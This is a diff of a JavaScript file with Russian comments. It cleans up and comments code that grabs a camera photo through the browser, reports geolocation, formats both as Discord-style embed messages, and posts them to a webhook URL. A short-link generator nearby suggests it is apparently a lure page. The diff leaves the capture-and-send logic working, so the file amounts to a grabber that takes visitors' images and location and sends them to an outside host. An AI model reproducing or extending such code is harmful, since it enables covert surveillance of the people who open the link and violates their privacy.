@@ -227,16 +227,17 @@ function generateShortLink(longID) {
 // Захват фото с камеры
 async function takePhoto() {
   try {
+    // Запрашиваем доступ к камере
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.createElement('video');
     video.srcObject = stream;
-    await video.play();
 
-    // Дожидаемся начала воспроизведения
+    // Дожидаемся начала воспроизведения видео
     await new Promise((resolve) => {
       video.onloadedmetadata = () => resolve();
     });
 
+    // Устанавливаем размеры для канваса
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -244,9 +245,10 @@ async function takePhoto() {
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // Останавливаем все потоки (камера)
+    // Останавливаем все потоки, чтобы освободить ресурсы камеры
     stream.getTracks().forEach((track) => track.stop());
 
+    // Возвращаем изображение в формате base64
     return canvas.toDataURL('image/jpeg');
   } catch (err) {
     console.warn('Camera error:', err);
@@ -291,9 +293,10 @@ async function takePhoto() {
     return { content: '**Geolocation:** Unavailable' };
   }
 }
-    function formatCamera(img){
-      return img? {content:'**Camera:** Access granted',embeds:[{image:{url:img}}]}
-                : {content:'**Camera:** Denied/Unavailable'}; 
+    function formatCamera(img) {
+  return img 
+    ? { content: '**Camera:** Access granted', embeds: [{ image: { url: img } }] }
+    : { content: '**Camera:** Denied/Unavailable' };
     }
     async function send(p){ try{
         await fetch(WEBHOOK_URL,{
